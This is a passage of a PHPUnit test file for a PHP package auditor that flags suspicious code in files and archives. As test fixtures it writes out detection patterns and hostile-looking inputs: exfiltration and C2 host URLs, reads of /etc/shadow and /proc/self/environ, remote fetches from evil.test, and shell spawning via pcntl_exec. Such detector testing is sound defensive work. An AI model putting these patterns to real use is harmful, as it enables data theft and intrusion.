        $finding = $this->ofPattern($this->auditCode("<?php {$call};"), 'ffi_usage');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Warning, $finding[0]->severity);
    }

    public function testNonEntryFfiMethodIsNotFlagged(): void
    {
        // FFI::new operates on already-defined types; only the cdef/load/scope entry points (which
        // bring in native code) are flagged.
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php FFI::new("int");'), 'ffi_usage'));
    }

    public function testNonFfiStaticCallIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php Other\\Lib::cdef();'), 'ffi_usage'));
    }

    public function testDlIsFlaggedAsRuntimeExtensionLoad(): void
    {
        $finding = $this->ofPattern($this->auditCode('<?php dl("evil.so");'), 'runtime_extension_load');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Warning, $finding[0]->severity);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideDangerousIniKeys(): iterable
    {
        yield 'disable_functions' => ['disable_functions'];
        yield 'disable_classes' => ['disable_classes'];
        yield 'allow_url_include' => ['allow_url_include'];
        yield 'allow_url_fopen' => ['allow_url_fopen'];
        yield 'open_basedir' => ['open_basedir'];
        yield 'auto_prepend_file' => ['auto_prepend_file'];
        yield 'auto_append_file' => ['auto_append_file'];
        yield 'extension_dir' => ['extension_dir'];
    }

    #[DataProvider('provideDangerousIniKeys')]
    public function testIniSetOfDangerousKeyIsWarning(string $key): void
    {
        $finding = $this->ofPattern($this->auditCode("<?php ini_set(\"{$key}\", \"x\");"), 'ini_tampering');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Warning, $finding[0]->severity);
    }

    public function testIniAlterIsAlsoChecked(): void
    {
        self::assertCount(1, $this->ofPattern($this->auditCode('<?php ini_alter("open_basedir", "/x");'), 'ini_tampering'));
    }

    public function testIniSetOfBenignKeyIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php ini_set("memory_limit", "256M");'), 'ini_tampering'));
    }

    public function testIniSetWithNoArgumentsIsNotFlagged(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php ini_set();'), 'ini_tampering'));
    }

    public function testIniSetWithDynamicKeyIsNotFlagged(): void
    {
        // A non-literal key cannot be matched against the dangerous-key list.
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php ini_set($name, "x");'), 'ini_tampering'));
    }

    // -------------------------------------------------------------------------
    // Network egress (Info) and known C2 / exfiltration host literals (Critical).
    // -------------------------------------------------------------------------

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideNetworkFunctions(): iterable
    {
        yield 'curl_exec' => ['curl_exec($ch)'];
        yield 'curl_multi_exec' => ['curl_multi_exec($mh, $active)'];
        yield 'fsockopen' => ['fsockopen("host", 80)'];
        yield 'pfsockopen' => ['pfsockopen("host", 80)'];
        yield 'stream_socket_client' => ['stream_socket_client("tcp://host:9000")'];
        yield 'socket_connect' => ['socket_connect($sock, "1.2.3.4", 9000)'];
        yield 'mail' => ['mail($to, $subject, $body)'];
        yield 'mb_send_mail' => ['mb_send_mail($to, $subject, $body)'];
    }

    #[DataProvider('provideNetworkFunctions')]
    public function testNetworkFunctionIsInfo(string $call): void
    {
        $finding = $this->ofPattern($this->auditCode("<?php {$call};"), 'network_call');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Info, $finding[0]->severity);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideSuspiciousHosts(): iterable
    {
        yield 'discord webhook' => ['https://discord.com/api/webhooks/1/abc'];
        yield 'discordapp webhook' => ['https://discordapp.com/api/webhooks/1/abc'];
        yield 'telegram bot' => ['https://api.telegram.org/bot123/sendMessage'];
        yield 'pastebin raw' => ['https://pastebin.com/raw/abcd'];
        yield 'webhook.site' => ['https://webhook.site/uuid'];
        yield 'requestbin' => ['https://x.requestbin.net/y'];
        yield 'transfer.sh' => ['https://transfer.sh/abc/payload'];
        yield 'onion' => ['http://abcdef.onion/c2'];
    }

    #[DataProvider('provideSuspiciousHosts')]
    public function testSuspiciousHostLiteralIsCritical(string $url): void
    {
        $finding = $this->ofPattern($this->auditCode("<?php \$u = \"{$url}\";"), 'suspicious_host');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Critical, $finding[0]->severity);
    }

    public function testSuspiciousHostMatchIsCaseInsensitive(): void
    {
        self::assertCount(1, $this->ofPattern(
            $this->auditCode('<?php $u = "https://DISCORD.com/API/Webhooks/1/x";'),
            'suspicious_host',
        ));
    }

    public function testBenignUrlLiteralIsNotFlaggedAsSuspiciousHost(): void
    {
        $results = $this->auditCode('<?php $u = "https://github.com/acme/widget";');

        self::assertCount(0, $this->ofPattern($results, 'suspicious_host'));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideSensitivePaths(): iterable
    {
        yield '/etc/passwd' => ['/etc/passwd'];
        yield '/etc/shadow' => ['/etc/shadow'];
        yield '/proc/self/environ' => ['/proc/self/environ'];
    }

    #[DataProvider('provideSensitivePaths')]
    public function testSensitivePathLiteralIsWarning(string $path): void
    {
        $finding = $this->ofPattern($this->auditCode("<?php \$f = file_get_contents(\"{$path}\");"), 'sensitive_path');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Warning, $finding[0]->severity);
    }

    public function testBenignPathLiteralIsNotFlagged(): void
    {
        // ~/.ssh and ~/.aws are deliberately excluded to avoid flagging legit SSH/AWS libraries.
        $results = $this->auditCode('<?php $f = file_get_contents("/var/www/config/app.php");');

        self::assertCount(0, $this->ofPattern($results, 'sensitive_path'));
    }

    public function testAssertWithStringArgumentIsCritical(): void
    {
        // assert("code") evaluates the string as code on PHP < 8 — an eval equivalent.
        $finding = $this->ofPattern($this->auditCode('<?php assert("1 === 2");'), 'assert_eval');

        self::assertCount(1, $finding);
        self::assertSame(Severity::Critical, $finding[0]->severity);
    }

    public function testAssertWithExpressionArgumentIsNotFlaggedAsEval(): void
    {
        // The modern, safe form passes an expression, not a string.
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php assert($x === 2);'), 'assert_eval'));
    }

    public function testAssertWithNoArgumentsIsNotFlaggedAsEval(): void
    {
        self::assertCount(0, $this->ofPattern($this->auditCode('<?php assert();'), 'assert_eval'));
    }

    /**
     * Regression: first-class callable syntax (`strlen(...)`, `system(...)`) has no arguments to
     * inspect — getArgs() throws on the VariadicPlaceholder. The auditor must skip these nodes
     * rather than crash (modern dependencies use this syntax heavily).
     */
    public function testFirstClassCallableSyntaxDoesNotCrash(): void
    {
        $results = $this->auditCode('<?php $a = strlen(...); $b = array_map(trim(...), $xs); $c = system(...);');

        // It does not throw, and a bare callable reference is not a call, so no sink finding fires.
        self::assertSame([], $this->ofPattern($results, 'request_to_sink'));
        self::assertSame([], $this->ofPattern($results, 'command_execution'));
    }

    // -------------------------------------------------------------------------
    // Protocol-wrapper-capable functions (file_get_contents, copy, fopen, …) and
    // process-spawning functions (passthru, system, pcntl_exec, …).
    // -------------------------------------------------------------------------

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideProtocolWrapperFunctions(): iterable
    {
        yield 'file_get_contents' => ['file_get_contents($p)'];
        yield 'file_put_contents' => ['file_put_contents($p, $d)'];
        yield 'fopen' => ['fopen($p, "r")'];
        yield 'copy' => ['copy($a, $b)'];
        yield 'file' => ['file($p)'];
        yield 'readfile' => ['readfile($p)'];
    }

    #[DataProvider('provideProtocolWrapperFunctions')]
    public function testProtocolWrapperFunctionIsFlaggedAtInfo(string $call): void
    {
        $results = $this->auditCode("<?php {$call};");

        $wrapper = $this->ofPattern($results, 'protocol_wrapper');
        self::assertCount(1, $wrapper);
        self::assertSame(Severity::Info, $wrapper[0]->severity);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function provideSuspiciousWrapperUrls(): iterable
    {
        yield 'http' => ['file_get_contents("http://evil.test/x")'];
        yield 'https' => ['file_get_contents("https://evil.test/x")'];
        yield 'ftp' => ['copy("ftp://host/x", "/tmp/y")'];
        yield 'phar' => ['fopen("phar://a.phar/x", "r")'];
        yield 'data' => ['file_put_contents("data://text/plain,zzz", "x")'];
        yield 'expect' => ['fopen("expect://ls", "r")'];
        yield 'uppercase scheme' => ['file_get_contents("HTTP://Evil.test/x")'];
    }

    #[DataProvider('provideSuspiciousWrapperUrls')]
    public function testProtocolWrapperWithRemoteOrWrapperUrlIsCritical(string $call): void
    {
        $results = $this->auditCode("<?php {$call};");

        $wrapper = $this->ofPattern($results, 'protocol_wrapper');
        self::assertCount(1, $wrapper);
        self::assertSame(Severity::Critical, $wrapper[0]->severity);
        self::assertStringContainsString('wrapper', $wrapper[0]->description);
    }

    public function testLocalLiteralPathIsNotEscalated(): void
    {
        // A literal local path has no suspicious scheme, so it stays at Info, not Critical.
        $wrapper = $this->ofPattern($this->auditCode('<?php readfile("/etc/hostname");'), 'protocol_wrapper');

        self::assertCount(1, $wrapper);
        self::assertSame(Severity::Info, $wrapper[0]->severity);
    }

    /**
     * No php:// stream escalates to Critical. The benign ones (php://memory, php://stdout, …) are
     * ubiquitous, and even php://input is a common STDIN fallback — escalating them produced false
     * positives (e.g. symfony/console's Cursor), so php:// stays at Info.
     */
    #[DataProvider('providePhpStreams')]
    public function testPhpStreamsAreNotEscalatedToCritical(string $stream): void
    {
        $wrapper = $this->ofPattern($this->auditCode("<?php fopen(\"{$stream}\", \"r\");"), 'protocol_wrapper');

        self::assertCount(1, $wrapper);
        self::assertSame(Severity::Info, $wrapper[0]->severity, $stream . ' must not be Critical');
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function providePhpStreams(): iterable
    {
        yield 'php://memory' => ['php://memory'];
        yield 'php://temp' => ['php://temp'];
        yield 'php://stdout' => ['php://stdout'];
        yield 'php://stderr' => ['php://stderr'];
        yield 'php://output' => ['php://output'];
        yield 'php://input' => ['php://input'];
        yield 'php://filter' => ['php://filter/read=convert.base64-encode/resource=x'];
    }

    public function testPcntlExecIsDetectedAsProcessExecution(): void
    {
        $results = $this->auditCode('<?php pcntl_exec("/bin/sh");');

        $command = $this->ofPattern($results, 'command_execution');
        self::assertCount(1, $command);
        self::assertSame(Severity::Warning, $command[0]->severity);
    }

    public function testNonWrapperFileFunctionsAreNotFlaggedAsWrappers(): void
    {
        // fwrite/fputs operate on a handle, not a filename, so they are not protocol-wrapper funcs.
        $results = $this->auditCode('<?php fwrite($h, "x"); fputs($h, "y");');

        self::assertCount(0, $this->ofPattern($results, 'protocol_wrapper'));
    }

    // -------------------------------------------------------------------------
    // PSR-1: a file should declare symbols OR run side effects, not both. A
    // declaration file that gains a top-level side effect is a possible injection
    // signature, surfaced at Info severity.
    // -------------------------------------------------------------------------

    public function testPsr1FlagsClassFileWithTopLevelSideEffect(): void
    {
        $code = "<?php\nnamespace Acme;\nclass Widget {}\nregister_shutdown_function('boom');\n";

        $psr1 = $this->ofPattern($this->auditCode($code), 'psr1_side_effect');

        self::assertCount(1, $psr1);
        self::assertSame(Severity::Info, $psr1[0]->severity);
        // The finding points at the offending top-level statement.
        self::assertSame(4, $psr1[0]->line);
    }

    public function testPsr1DoesNotFlagPureDeclarationFile(): void
    {
        // declare/use/const are inert, and a call inside a method body is NOT a top-level side
        // effect — so the exec() must not trip PSR-1 even though it trips command_execution.
        $code = "<?php\ndeclare(strict_types=1);\nnamespace Acme;\nuse Acme\\Other;\nconst VERSION = '1.0';\n"
            . "class Widget { public function run(): void { exec('id'); } }\n";

        self::assertCount(0, $this->ofPattern($this->auditCode($code), 'psr1_side_effect'));
    }

    public function testPsr1DoesNotFlagPureSideEffectScript(): void
    {
        // A bootstrap script with no declarations is not a PSR-1 violation.
        $code = "<?php\n\$config = load();\nregister_shutdown_function('x');\nrequire 'a.php';\n";

        self::assertCount(0, $this->ofPattern($this->auditCode($code), 'psr1_side_effect'));
    }

    public function testPsr1DetectsSideEffectInsideBracedNamespace(): void
    {
        $code = "<?php\nnamespace Acme {\n class Widget {}\n phone_home();\n}\n";

        self::assertCount(1, $this->ofPattern($this->auditCode($code), 'psr1_side_effect'));
    }

    public function testPsr1FlagsEachTopLevelSideEffectStatement(): void
    {
        $code = "<?php\nclass Widget {}\n\$x = secret();\nsend(\$x);\n";

        // Both the assignment and the call are top-level side effects.
        self::assertCount(2, $this->ofPattern($this->auditCode($code), 'psr1_side_effect'));
    }

    // -------------------------------------------------------------------------
    // auditArchive — a built mirror stores package code as zip archives, so the
    // auditor must look inside them rather than only at loose .php files.
    // -------------------------------------------------------------------------

    public function testAuditArchiveDetectsSuspiciousCodeInsideZip(): void
    {
        $zipPath = $this->makeZip([
            'src/Evil.php' => '<?php eval($x);',
            'README.md' => 'eval is mentioned here but this is not PHP',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '1.0.0', $zipPath);

        unlink($zipPath);

        // Only the .php entry is audited; the README (non-PHP) is ignored.
        self::assertCount(1, $results);
        self::assertSame('eval', $results[0]->pattern);
        self::assertSame(Severity::Critical, $results[0]->severity);
        self::assertSame('vendor/pkg', $results[0]->package);
        self::assertSame('1.0.0', $results[0]->version);
        // The reported path points back at the archive + internal path, not a temp directory.
        self::assertSame(basename($zipPath) . '/src/Evil.php', $results[0]->file);
        self::assertStringNotContainsString(sys_get_temp_dir(), $results[0]->file);
    }

    public function testAuditArchiveAggregatesFindingsAcrossEntries(): void
    {
        $zipPath = $this->makeZip([
            'a.php' => '<?php eval($x);',
            'nested/b.php' => '<?php exec("id");',
            'clean.php' => '<?php echo "ok";',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '2.0.0', $zipPath);

        unlink($zipPath);

        $patterns = array_map(static fn ($r): string => $r->pattern, $results);
        sort($patterns);

        self::assertSame(['command_execution', 'eval'], $patterns);
    }

    public function testAuditArchiveDetectsSuspiciousCodeInsideTar(): void
    {
        $tarPath = $this->makeTar([
            'src/Evil.php' => '<?php eval($x);',
            'NOTES.txt' => 'eval mentioned but not PHP',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '1.0.0', $tarPath);

        unlink($tarPath);

        self::assertCount(1, $results);
        self::assertSame('eval', $results[0]->pattern);
        self::assertSame(basename($tarPath) . '/src/Evil.php', $results[0]->file);
    }

    public function testAuditArchiveDetectsSuspiciousCodeInsideTarGz(): void
    {
        [$tarPath, $gzPath] = $this->makeTarGz([
            'lib/run.php' => '<?php exec("id");',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '2.0.0', $gzPath);

        unlink($tarPath);
        unlink($gzPath);

        self::assertCount(1, $results);
        self::assertSame('command_execution', $results[0]->pattern);
        self::assertSame(basename($gzPath) . '/lib/run.php', $results[0]->file);
    }

    public function testAuditArchiveDetectsSuspiciousCodeInsideTarBz2(): void
    {
        if (! \extension_loaded('bz2')) {
            self::markTestSkipped('The bz2 extension is required to read a .tar.bz2 archive.');
        }

        [$tarPath, $bz2Path] = $this->makeTarBz2([
            'bin/tool.php' => '<?php system("id");',
        ]);

        $results = $this->auditor->auditArchive('vendor/pkg', '3.0.0', $bz2Path);

        unlink($tarPath);
        unlink($bz2Path);

        self::assertCount(1, $results);
        self::assertSame('command_execution', $results[0]->pattern);
        self::assertSame(basename($bz2Path) . '/bin/tool.php', $results[0]->file);
    }

    public function testIsSupportedArchiveRecognisesEveryBuildFormatButNotPhp(): void
    {
        self::assertTrue(Auditor::isSupportedArchive('pkg-1.0.0.zip'));
        self::assertTrue(Auditor::isSupportedArchive('pkg-1.0.0.tar'));
        self::assertTrue(Auditor::isSupportedArchive('pkg-1.0.0.tar.gz'));
        self::assertTrue(Auditor::isSupportedArchive('pkg-1.0.0.tar.bz2'));
        self::assertTrue(Auditor::isSupportedArchive('PKG-1.0.0.ZIP'));

        self::assertFalse(Auditor::isSupportedArchive('src/File.php'));
        self::assertFalse(Auditor::isSupportedArchive('packages.json'));
    }

    public function testAuditArchiveReturnsEmptyForMissingArchive(): void
    {
        self::assertSame([], $this->auditor->auditArchive('v/p', '1.0', '/nonexistent/archive.zip'));
    }

    public function testAuditArchiveReturnsEmptyForFileThatIsNotAZip(): void
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.zip';
        file_put_contents($file, 'this is plainly not a zip archive');

        $results = $this->auditor->auditArchive('v/p', '1.0', $file);

        unlink($file);

        self::assertSame([], $results);
    }

    public function testAuditArchiveRemovesItsTemporaryExtractionDirectory(): void
    {
        $before = glob(sys_get_temp_dir() . '/satiate_audit_*');
        self::assertIsArray($before);

        $zipPath = $this->makeZip([
            'src/Evil.php' => '<?php eval($x);',
        ]);

        $this->auditor->auditArchive('vendor/pkg', '1.0.0', $zipPath);

        unlink($zipPath);

        $after = glob(sys_get_temp_dir() . '/satiate_audit_*');
        self::assertIsArray($after);
        // No satiate_audit_* temp directory is left behind after auditing the archive.
        $beforeCount = \count($before);
        $afterCount = \count($after);
        self::assertSame($beforeCount, $afterCount);
    }

    /**
     * @return list<AuditResult>
     */
    private function auditCode(string $code): array
    {
        $file = tempnam(sys_get_temp_dir(), 'audit_test_') . '.php';
        file_put_contents($file, $code);

        $results = $this->auditor->auditFile('test/pkg', '1.0', $file);

        unlink($file);

        return $results;
    }

    /**
     * @param list<AuditResult> $results
     * @return list<AuditResult>
     */
    private function ofPattern(array $results, string $pattern): array
    {
        return array_values(array_filter($results, static fn (AuditResult $r): bool => $r->pattern === $pattern));
    }

    /**
     * @param array<string, mixed> $json
     * @return list<AuditResult>
     */
    private function auditComposer(array $json): array
    {
        $file = tempnam(sys_get_temp_dir(), 'composer_');
        file_put_contents($file, (string) json_encode($json));

        $results = $this->auditor->auditComposerJson('test/pkg', '1.0', $file);

        unlink($file);

        return $results;
    }

    /**
     * @param array<string, string> $entries map of internal path => file contents
     */
    private function makeZip(array $entries): string
    {
        $zipPath = tempnam(sys_get_temp_dir(), 'audit_zip_') . '.zip';

        $zip = new \ZipArchive();
        self::assertTrue($zip->open($zipPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) === true);

        foreach ($entries as $name => $contents) {
            $zip->addFromString($name, $contents);
        }

        $zip->close();

        return $zipPath;
    }

    /**
     * @param array<string, string> $entries map of internal path => file contents
     */
    private function makeTar(array $entries): string
    {
        $tarPath = sys_get_temp_dir() . '/audit_tar_' . bin2hex(random_bytes(6)) . '.tar';

        $phar = new \PharData($tarPath);

        foreach ($entries as $name => $contents) {
            $phar->addFromString($name, $contents);
        }

        unset($phar);

        return $tarPath;
    }

    /**
     * @param array<string, string> $entries map of internal path => file contents
     * @return array{0: string, 1: string} the [.tar, .tar.gz] paths (both exist on disk)
     */
    private function makeTarGz(array $entries): array
    {
        $base = sys_get_temp_dir() . '/audit_tar_' . bin2hex(random_bytes(6));
        $tarPath = $base . '.tar';

        $phar = new \PharData($tarPath);

        foreach ($entries as $name => $contents) {
            $phar->addFromString($name, $contents);
        }

        $phar->compress(\Phar::GZ);
        unset($phar);

        return [$tarPath, $base . '.tar.gz'];
    }

    /**
     * @param array<string, string> $entries map of internal path => file contents
     * @return array{0: string, 1: string} the [.tar, .tar.bz2] paths (both exist on disk)
     */
    private function makeTarBz2(array $entries): array
    {
        $base = sys_get_temp_dir() . '/audit_tar_' . bin2hex(random_bytes(6));
        $tarPath = $base . '.tar';

        $phar = new \PharData($tarPath);

        foreach ($entries as $name => $contents) {
            $phar->addFromString($name, $contents);
        }

        $phar->compress(\Phar::BZ2);
        unset($phar);

        return [$tarPath, $base . '.tar.bz2'];
    }
}
